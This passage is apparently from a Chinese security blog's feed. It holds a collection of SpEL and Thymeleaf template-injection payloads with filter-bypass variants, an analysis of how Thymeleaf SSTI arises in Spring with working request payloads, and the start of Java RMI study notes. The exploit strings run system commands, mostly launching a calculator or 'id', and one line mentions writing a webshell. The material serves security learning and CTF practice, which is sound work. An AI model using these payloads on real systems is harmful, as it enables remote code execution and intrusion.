+[[${__${new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().findMethod(new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Runtime&quot;),&quot;getRuntime&quot;,null),&quot;invoke&quot;,{null,null},{new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Object&quot;),new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;org.&quot;+&quot;thymeleaf.util.ClassLoaderUtils&quot;).loadClass(&quot;[Ljava.lang.Object;&quot;)}),&quot;exec&quot;,&quot;open -a Calculator&quot;,new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.String&quot;))}__::x}]]
+
+# Thymeleaf模板注入中不带&quot;_&quot;的写法，参考：https://xz.aliyun.com/t/9826
+[[${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;).getInputStream()).next()}
+]]
+</code></pre>
+<p>之后有空了好好分析一下这道题目。</p>
+<h1 id="杂项">杂项</h1>
+<h2 id="整理偷的payload">整理（偷）的payload</h2>
+<pre><code>// PoC原型
+
+// Runtime
+T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
+T(Runtime).getRuntime().exec(&quot;calc&quot;)
+
+// ProcessBuilder
+new java.lang.ProcessBuilder({'calc'}).start()
+new ProcessBuilder({'calc'}).start()
+
+******************************************************************************
+// Bypass技巧
+
+// 反射调用
+T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)
+
+// 同上，需要有上下文环境
+#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)
+
+// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤
+T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})
+
+// 同上，需要有上下文环境
+#this.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})
+
+// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1
+// byte数组内容的生成后面有脚本
+new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
+
+// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2
+// byte数组内容的生成后面有脚本
+T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))
+
+// JavaScript引擎通用PoC
+T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)
+
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;xxx&quot;),)
+
+// JavaScript引擎+反射调用
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})),)
+
+// JavaScript引擎+URL编码
+// 其中URL编码内容为：
+// 不加最后的getInputStream()也行，因为弹计算器不需要回显
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(java.net.URLDecoder).decode(&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;)),)
+
+// 黑名单过滤&quot;.getClass(&quot;，可利用数组的方式绕过，还未测试成功
+''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')
+
+// JDK9新增的shell，还未测试
+T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
+
+// 转自：https://www.jianshu.com/p/ce4ac733a4b9
+
+${pageContext} 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）
+
+${pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)}   获取web路径
+
+${header}  文件头参数
+
+${applicationScope} 获取webRoot
+
+${pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())}  执行命令
+
+
+// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。
+
+&lt;p th:text=&quot;${#this.getClass().forName('java.lang.System').getProperty('user.dir')}&quot;&gt;&lt;/p&gt;   //获取web路径
+</code></pre>
+<h2 id="参考链接">参考链接</h2>
+<p>这些链接才是精华！！！<br>
+很好的背景知识：<a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a><br>
+<a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/">https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/</a><br>
+<a href="https://github.com/wearearima/poc-cve-2018-1273">https://github.com/wearearima/poc-cve-2018-1273</a><br>
+<a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a><br>
+很多payload：<a href="https://xz.aliyun.com/t/9245">https://xz.aliyun.com/t/9245</a><br>
+一道很有意思的题目：<a href="https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/">https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</a><br>
+Thymeleaf模板注入补充：<a href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a><br>
+关于：<br>
+<a href="https://www.yulate.com/index.php/archives/48/">https://www.yulate.com/index.php/archives/48/</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Thymeleaf模板注入]]></title>
+        <id>https://skyblu3519.github.io/post/thymeleaf-mo-ban-zhu-ru/</id>
+        <link href="https://skyblu3519.github.io/post/thymeleaf-mo-ban-zhu-ru/">
+        </link>
+        <updated>2024-04-12T16:53:08.000Z</updated>
+        <content type="html"><![CDATA[<p>实验环境参考：<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p>
+<h1 id="背景知识">背景知识</h1>
+<h2 id="片段表达式">片段表达式</h2>
+<p>片段表达式语法：</p>
+<ul>
+<li><code>~{templatename::selector}</code>，会在/WEB-INF/templates/目录下寻找名为templatename的模版中定义的fragment。</li>
+<li><code>~{templatename}</code>，引用整个<code>templatename</code>模版文件作为<code>fragment</code></li>
+<li><code>~{::selector} </code>或 <code>~{this::selector}</code>，引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code></li>
+</ul>
+<p>其中<code>selector</code>可以是通过<code>th:fragment</code>定义的片段，也可以是类选择器、ID选择器等。<br>
+当<code>~{}</code>片段表达式中出现<code>::</code>，则<code>::</code>后需要有值，也就是<code>selector</code>。</p>
+<h2 id="预处理表达式">预处理表达式</h2>
+<pre><code>__${expression}__
+</code></pre>
+<blockquote>
+<p>除了所有这些用于表达式处理的功能外，Thymeleaf 还具有预处理表达式的功能。<br>
+预处理是在正常表达式之前完成的表达式的执行，允许修改最终将执行的表达式。<br>
+预处理的表达式与普通表达式完全一样，但被双下划线符号（如__${expression}__）包围。</p>
+</blockquote>
+<h1 id="流程浅析">流程浅析</h1>
+<p>先简单看下渲染一个模板的流程。</p>
+<p>对于下面的 <code>controller</code>（注意：在使用<code>@Controller</code>定义时，返回的<code>index</code>不会被当作字符串，而是会作为一个模板名称）：</p>
+<pre><code class="language-java">@GetMapping(&quot;/&quot;)
+public String index(Model model) {
+    model.addAttribute(&quot;name&quot;, &quot;World&quot;);
+    return &quot;index&quot;;
+}
+</code></pre>
+<p>首先是处理请求<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>的逻辑<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712932311102-6eef5ab3-cf2b-4bc3-a3f1-fd9be12f67dd.png" alt="image.png" loading="lazy"></p>
+<p>前两步是根据请求的URL、HTTP方法等信息查找相应的<strong>Handler</strong>和<strong>Handler Adapter</strong>，具体的处理逻辑也就是执行我们写的<code>controller</code>代码是在</p>
+<pre><code class="language-java">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());
+</code></pre>
+<p>这里返回的<strong>ModelAndView</strong>对象包含了模型数据和视图名称<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712932938073-5769e749-dabf-471c-94d7-171fc60e63ae.png" alt="image.png" loading="lazy"></p>
+<p><code>processDispatchResult</code>会根据<strong>ModelAndView</strong>对象处理视图渲染<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933145805-53ed2640-5b9a-4394-b27d-947a060b6590.png" alt="image.png" loading="lazy"></p>
+<p><code>render</code>中<strong>DispatcherServlet</strong>会调用自己的<code>resolveViewName</code>方法根据视图名称和请求信息选出最适合的<strong>view</strong>对象，然后<strong>view</strong>对象调用它的<code>render</code>方法渲染模版处理请求。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933234854-0fca5626-e9ed-41ac-9b79-366fce0239de.png" alt="image.png" loading="lazy"></p>
+<p><code>DispatcherServlet#resolveViewName</code>会从遍历<code>viewResolvers</code>中存储的<strong>ViewResolver</strong>对象，调用它们的<code>resolveViewName</code>方法来寻找。<code>viewResolvers</code>实在SpringBoot初始化的时候加载的<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933612796-d978b9eb-e611-43fb-aa2f-4250ae7e0edf.png" alt="image.png" loading="lazy"></p>
+<p>这里第一个调用的是<strong>ContentNegotiatingViewResolver</strong>，它不是直接解析视图名称，而是根据请求的内容类型或请求参数决定使用哪个其他视图解析器。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933664702-4d3b8765-8bf6-4ec0-9d55-8178b2d41d54.png" alt="image.png" loading="lazy"></p>
+<p><code>ContentNegotiatingViewResolver#resolveViewName</code>选出<strong>View</strong>对象可以分为两步：</p>
+<ul>
+<li>获取候选视图：<code>getCandidateViews(viewName, locale, requestedMediaTypes)</code>方法会基于<strong>视图名称</strong>、<strong>地区设置</strong>和<strong>请求的媒体类型</strong>（Accept请求头）获取一系列候选视图。</li>
+<li>选择最佳视图：<code>getBestView(candidateViews, requestedMediaTypes, attrs)</code>方法从候选视图中选择最佳视图。这个选择是基于所<strong>请求的媒体类型</strong>，以及视图是否能够处理这些媒体类型。</li>
+</ul>
+<p>在<code>getCandidateViews</code>方法中可以发现，它依然是遍历自己的<code>viewResolvers</code>中的<strong>ViewResolver</strong>对象，然后调用它们的<code>resolveViewName</code>方法<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934282783-62b8bcda-b7da-44fe-9252-df538f4bcd7e.png" alt="image.png" loading="lazy"></p>
+<p>这里就可以看到<strong>ThymeleafViewResolver</strong>的<code>resolveViewName</code>方法被调用<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934386588-a6c54af4-08a9-4d38-9dae-970f4308d8f1.png" alt="image.png" loading="lazy"></p>
+<p>跟进这个方法，最后我们可以看到<strong>View</strong>对象是通过<code>ThymeleafViewResolver#loadView</code>生成的，这里还没有涉及到模板文件的读取。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934480852-1885a63f-ebe1-4270-80b0-dd011908c454.png" alt="image.png" loading="lazy"></p>
+<p>在由<code>ContentNegotiatingViewResolver#getBestView</code>选出最佳的<strong>View</strong>对象后，就会调用该对象的<code>render</code>方法。接着我们看下<code>ThymeleafView#renderFragment</code>，<code>ThymeleafView#render</code>的最终调用。</p>
+<p><code>ThymeleafView#renderFragment</code>的处理流程大致可以分为三步：</p>
+<ul>
+<li>渲染Thymeleaf模板前的准备：这里主要是一些变量的检查和上下文的设置。</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935393965-07d4006c-18d4-493f-9bd3-98ad23eb1eec.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li><code>viewtemplateName</code>的解析：漏洞的产生点，代码会根据<code>viewtemplateName</code>中是否含有<code>::</code>来决定是否要对其进行解析，最后解析出<code>templateName</code>变量。</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935621931-02f164fd-9b8d-47b3-91a0-ef0b54de2450.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>渲染模版，处理响应：在做好响应的类型、字符编码等配置后，使用<code>viewTemplateEngine.process</code>方法读取模板文件、解析模板内容、执行表达式、渲染结果等多个步骤。最后将内容返回给客户端</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935867500-6167221f-714c-4558-9342-97caca9b9b25.png" alt="image.png" loading="lazy"></figure>
+<h1 id="漏洞成因">漏洞成因</h1>
+<p>漏洞的成因就在解析<code>viewTemplateName</code>的代码中，当<code>viewTemplateName</code>中含有<code>::</code>，会用<code>&quot;~{&quot; + viewTemplateName + &quot;}&quot;</code>包裹将其作为一个片段表达式，调用<code>parser.parseExpression</code>进行解析<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712936048123-abc8f184-0b05-4952-bd9d-9a4e4495b8fd.png" alt="image.png" loading="lazy"></p>
+<p>跟进实现，<code>StandardExpressionParser#parseExpression</code>中有一步预处理的流程，根据名字可以猜到它处理的就是表达式中<code>__${expression}__</code>预处理表达式的部分<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712937292709-f75f1916-50d4-408d-a0de-fe5377191773.png" alt="image.png" loading="lazy"></p>
+<p>跟进<code>StandardExpressionPreprocessor#preprocess</code>，如果没有<code>_</code>直接返回<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712937457017-1e2a1796-1461-45da-b850-79e86af0cc78.png" alt="image.png" loading="lazy"></p>
+<p>之后的解析流程会先用正则<code>\_\_(.*?)\_\_</code>匹配出<strong>预处理表达式之间的内容</strong>，再传给<code>StandardExpressionParser.parseExpression</code>进行解析（这是作为了一个变量表达式递归解析？），最后调用解析出来的<strong>IStandardExpression</strong>对象的<code>execute</code>方法<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938072287-061f06bf-8c4c-49fd-a741-303f3cdfa727.png" alt="image.png" loading="lazy"></p>
+<p>在<code>expression.execute</code>的最后会将<strong>预处理表达式之间的内容</strong>作为<strong>SpEL执行表达式</strong>（加入学习列表）解析，进而触发任意代码执行。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938381093-b1806f25-ee8d-4633-8d95-a8d7004aa291.png" alt="image.png" loading="lazy"></p>
+<p>小结一下：</p>
+<ul>
+<li>漏洞的成因是在<strong>ThymeleafView</strong>对象调用<code>render</code>方法渲染模板的时候产生的，准确的说应该是在解析自己的<code>templateName</code>属性时产生的</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938848792-58c8f143-f455-4006-8959-e2e5512131e3.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>当攻击者可以控制解析的<code>templateName</code>即可产生漏洞，具体而言满足的条件有（来自turn1tup师傅的总结）：
+<ul>
+<li>用户传入的字符串拼接到了<code>Controller</code>方法的返回值中且返回的视图非重定向（重定向优先级最高），或URI路径拼接了用户的输入且<code>Controller</code>方法参数中不带有<code>ServletResponse</code>类型的参数</li>
+<li>视图引擎名称中需要包含<code>::</code>字符串</li>
+<li>被执行表达式字符串前后需要带有两个下划线，即<code>__${EL}__</code>；</li>
+<li>如果POC在URI中，由于URI格式化的原因且我们的POC中带有<code>.</code>符号，所以需要在URI末尾添加<code>.</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="攻击方式">攻击方式</h1>
+<p>根据可控位置的不同，大致有三种利用场景</p>
+<h2 id="select">select</h2>
+<pre><code class="language-java">@GetMapping(&quot;/fragment&quot;)
+public String fragment(@RequestParam String section) {
+    return &quot;index :: &quot; + section; // fragment is tainted
+}
+</code></pre>
+<p>很简单易懂，payload</p>
+<pre><code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}__::.x
+</code></pre>
+<h2 id="path">/path</h2>
+<pre><code class="language-java">@GetMapping(&quot;/path&quot;)
+public String path(@RequestParam String lang) {
+    return &quot;user/&quot; + lang + &quot;/index&quot;; // template path is tainted
+}
+</code></pre>
+<p>payload和上面一样，虽然第一感觉有点反直觉，但看到最后处理的<code>viewTemplateName</code>就懂了</p>
+<pre><code>user/__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22).getInputStream()).next()}__::.x/index
+</code></pre>
+<h2 id="uri-path">URI PATH</h2>
+<pre><code class="language-java">@GetMapping(&quot;/doc/{document}&quot;)
+public void getDocument(@PathVariable String document) {
+    log.info(&quot;Retrieving &quot; + document);
+    //returns void, so view name is taken from URI
+}
+</code></pre>
+<p>因为<code>mav</code>返回值为空，所以<code>viewTemplateName</code>会从uri中获取，直接在<code>{document}</code>位置传入payload即可</p>
+<pre><code>/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.x
+</code></pre>
+<h2 id="其他姿势">其他姿势</h2>
+<p>记下poc</p>
+<pre><code># 构造回显，在最后加两个.
+/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::..
+
+# 最后只加个.也是可以的，不一定必须是.x
+/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.
+
+# :: 位置不用固定
+::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__
+
+# POST方式
+POST /path HTTP/1.1
+Host: localhost:8090
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 135
+
+lang=::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__
+
+# 省略__
+# 情况如下
+@RequestMapping(&quot;/path&quot;)
+public String path2(@RequestParam String lang) {
+    return lang; //template path is tainted
+}
+
+GET /path2?lang=$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d::.x HTTP/1.1
+Host: localhost:8090
+</code></pre>
+<h1 id="参考">参考</h1>
+<p><a href="https://www.cnblogs.com/CoLo/p/15507738.html">https://www.cnblogs.com/CoLo/p/15507738.html</a><br>
+<a href="https://xz.aliyun.com/t/9826?">https://xz.aliyun.com/t/9826</a><br>
+<a href="https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/">https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/</a><br>
+<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Java RMI 学习笔记（一）]]></title>
+        <id>https://skyblu3519.github.io/post/java-rmi-xue-xi-bi-ji-yi/</id>
+        <link href="https://skyblu3519.github.io/post/java-rmi-xue-xi-bi-ji-yi/">
+        </link>
+        <updated>2024-04-01T15:17:19.000Z</updated>
+        <content type="html"><![CDATA[<p>⚠️ 注意：这是一篇粗糙的个人笔记！！！</p>
+<p>📖 参考文章：<a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p>
+<h1 id="流程涉及的部分类及其意义">流程涉及的部分类及其意义</h1>
+<p>注册表：java.rmi.registry.Registry<br>
+注册表获取与创建：java.rmi.registry.LocateRegistry<br>
+远程类所继承的：java.rmi.server.UnicastRemoteObject<br>
+远程对象的应用信息：sun.rmi.transport.LiveRef<br>
+处理客户端对远程对象的调用请求（代表服务端）：java.rmi.server.UnicastServerRef<br>
+远程对象引用的一个具体实现（代表客户端）：java.rmi.server.UnicastRef<br>
+处理网络传输层相关任务的类和接口：sun.rmi.transport<br>
+ObjectTable负责管理服务器端的远程对象引用。</p>
+<h1 id="源码分析">源码分析</h1>
+<h2 id="创建">创建</h2>
+<h3 id="远程对象创建">远程对象创建</h3>
+<p>远程对象实例化的时候，会调用UnicastRemoteObject的构造方法。</p>
+<p>最后会调用UnicastServerRef的exportObject方法<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711882519441-d328f624-cf31-4aab-8407-3cbe0dd9ef52.png" alt="image.png" loading="lazy"></p>
+<p>而UnicastServerRef在初始化的时候，会用一个LiveRef对象为自己的ref属性赋值<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711882644062-c4a71bf3-f5eb-43e4-b1fb-531adced27dd.png" alt="image.png" loading="lazy"></p>
+<p>LiveRef对象则封装了这个远程对象引用信息<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711882938646-ef56f2f1-2496-429b-91e1-0a10c9a76ffe.png" alt="image.png" loading="lazy"></p>
+<p>这里UnicastServerRef的exportObject方法主要做了三件事：</p>
+<ul>
+<li>为这个远程对象创建一个存根（<strong>stub</strong>）</li>
+<li>创建目标（<strong>Target</strong>）实例。</li>
+<li>调用<code>ref.exportObject(target)</code>将远程对象导出，使其可以接受远程调用。</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/javarmi1/1711883462008-5e23c978-c91e-4424-a1fe-a3eac24c0f1b.png" alt="image.png" loading="lazy"></figure>
+<p>在调用<code>Util.createProxy(implClass, getClientRef(), forceStubUse)</code>创建stub的时候调用<code>getClientRef()</code>所返回的是一个根据<strong>UnicastServerRef</strong>的<strong>ref</strong>属性创建的<strong>UnicastRef</strong>实例<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711883855723-d632b4f8-5208-40cd-ac49-f28787c579e7.png" alt="image.png" loading="lazy"></p>
+<p>而stub其实是我们远程方法的一个动态代理，它的使用的<strong>InvocationHandler</strong>是<strong>RemoteObjectInvocationHandler</strong><br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711893132257-33d9e2a5-4ee2-48f7-ae21-244958f26c8b.png" alt="image.png" loading="lazy"></p>
+<p><strong>RemoteObjectInvocationHandler</strong>继承于<strong>RemoteObject</strong>，实例化的时候会接受一个<strong>UnicastRef</strong>为自己的<strong>ref</strong>属性赋值，在远程调用的时候就会依靠这个<strong>ref</strong>去于服务器进行通讯。它的invoke方法在后文会说<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711893468082-cc75cba7-0c97-4b11-98ba-47ff724a118e.png" alt="image.png" loading="lazy"></p>
+<p>创建好stub之后，紧接着会创建Target实例。该实例封装了远程对象（<strong>impl</strong>），它所属的<strong>UnicastServerRef</strong>实例（通常是<strong>this</strong>），远程对象的存根（<strong>stub</strong>），对象ID（由<code>ref.getObjID()</code>获取），以及是否为永久导出（<strong>permanent</strong>参数）的信息。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711893811020-696dd2f6-e5cb-45be-99a7-0c2ad35a4bb1.png" alt="image.png" loading="lazy"></p>
+<p>然后调用<strong>LiveRef</strong>的<strong>exportObject</strong>将对象导出。这里最终会调用到<code>sun.rmi.transport.tcp.TCPTransport#exportObject</code>，其中会监听本地端口，</p>
+<blockquote>
+<p>在 export 时，会随机绑定一个端口，监听客户端的请求，所以即使不注册，直接请求这个端口也可以通信。</p>
+</blockquote>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/javarmi1/1711894114367-b5ac45d8-ff9b-4fdb-871c-084028f59da4.png" alt="image.png" loading="lazy"></figure>
+<p>然后调用 <strong>Transport</strong> 的 exportObject 方法将 Target 实例注册到 ObjectTable 中。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711894199606-7520e635-a30b-4198-a604-0ac8e7b5bfd6.png" alt="image.png" loading="lazy"></p>
+<p><strong>ObjectTable</strong>用来管理所有发布的服务实例 <strong>Target</strong>，<strong>ObjectTable</strong> 提供了根据 <strong>ObjectEndpoint</strong> 和 <strong>Remote</strong> 实例两种方式查找 <strong>Target</strong> 的方法<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711894356938-955091ad-7a5e-4163-a425-d690e4308001.png" alt="image.png" loading="lazy"></p>
+<h3 id="注册中心创建">注册中心创建</h3>
+<p>调用<strong>java.rmi.registry.LocateRegistry#createRegistry</strong>实例化一个<strong>RegistryImpl</strong><br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711895416279-0a52cd51-f67d-4b2b-9237-c513741112ea.png" alt="image.png" loading="lazy"></p>
+<p>实例化一个<strong>UnicastServerRef</strong>然后调用<strong>setup</strong>方法<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711895634033-e9e12a86-20d3-4e6d-9a10-30cd8af2c8c0.png" alt="image.png" loading="lazy"></p>
+<p>setup会调用<strong>UnicastServerRef</strong>的<strong>exportObject</strong>将自己（<strong>RegistryImpl</strong>）导出（<strong>RegistryImpl</strong>的<strong>ref</strong>是<strong>UnicastServerRef</strong>）<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711895869676-202a0bb7-2f6c-408f-9cda-c9fad5034d0c.png" alt="image.png" loading="lazy"></p>
+<p>后面的内容和远程对象创建的流程基本一样，第一个区别在<strong>createProxy</strong>。<strong>createProxy</strong>在创建<strong>stub</strong>的时候会判断本地是否有远程对象的存根类存在<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711896075903-3d00d489-e277-4133-8d68-1e20687e5a9f.png" alt="image.png" loading="lazy"></p>
+<p>判断的方式就是查看是否有<code>远程对象类名+&quot;_Stub&quot;</code>的类存在<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711896181403-6cadbb31-6982-4388-a25c-b55327fc6159.png" alt="image.png" loading="lazy"></p>
+<p>这里就会把<strong>RegistryImpl_Stub</strong>找出来然后实例化返回<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711896312090-b503c2b2-6445-434e-a066-166bf75864db.png" alt="image.png" loading="lazy"></p>
+<p><strong>RegistryImpl_Stub</strong>和<strong>RemoteObjectInvocationHandler</strong>同样继承于<strong>RemoteObject</strong>，实例化的时候也会接受一个<strong>LiveRef</strong>。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711896706634-5b3ab7b5-4310-4762-af01-929257fd56ff.png" alt="image.png" loading="lazy"></p>
+<p>第二个区别在<strong>RegistryImpl_Stub</strong>创建好之后，会调用<strong>setSkeleton</strong>设置<strong>UnicastServerRef</strong>的<strong>skel</strong>属性<br>
